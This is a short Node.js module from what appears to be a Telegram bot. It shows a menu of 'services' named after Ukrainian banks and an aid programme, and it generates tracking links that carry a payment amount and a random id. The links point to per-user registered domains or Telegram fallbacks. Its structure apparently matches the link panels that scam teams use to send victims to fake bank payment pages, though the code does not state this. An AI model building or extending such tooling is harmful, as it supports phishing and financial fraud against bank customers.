const crypto = require('crypto');
const { applications } = require('./storage');

const serviceLinks = {
  'Допомога': 'https://t.me/dopomoga_group',
  'Райф': 'https://t.me/raif_group',
  'Ощад': 'https://t.me/oshchad_group',
  'Приват': 'https://t.me/privat_group',
  'Вайбер': 'https://t.me/viber_group',
};

const generateLink = (service, amount, userId) => {
  const userDomain = Object.entries(applications.domains || {})
    .find(([_, data]) => data.ownerId === String(userId) && data.active && data.verified)?.[0];
  const baseUrl = userDomain ? `https://${userDomain}` : (serviceLinks[service] || 'https://t.me/fallback_group');
  const id = crypto.randomUUID();
  const url = `${baseUrl}?amount=${amount}&id=${id}`;
  if (!url.startsWith('https://')) {
    console.error(`Ошибка: некорректный URL для сервиса ${service} или домена ${userDomain}: ${url}`);
    return 'https://t.me/fallback_group';
  }
  console.log(`Сгенерирована ссылка для ${userId}: ${url}`);
  return url;
};

const showServices = (ctx) => {
  console.log(`Показ списка сервисов для ${ctx.from.id}`);
  ctx.reply('Выберите сервис:', {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '1 - Допомога', callback_data: 'service_dopomoga' },
          { text: '2 - Райф', callback_data: 'service_raif' },
        ],
        [
          { text: '3 - Ощад', callback_data: 'service_oshchad' },
          { text: '4 - Приват', callback_data: 'service_privat' },
        ],
        [{ text: '5 - Вайбер', callback_data: 'service_viber' }],
      ],
    },
  });
};

module.exports = {
  serviceLinks,
  generateLink,
  showServices,
};
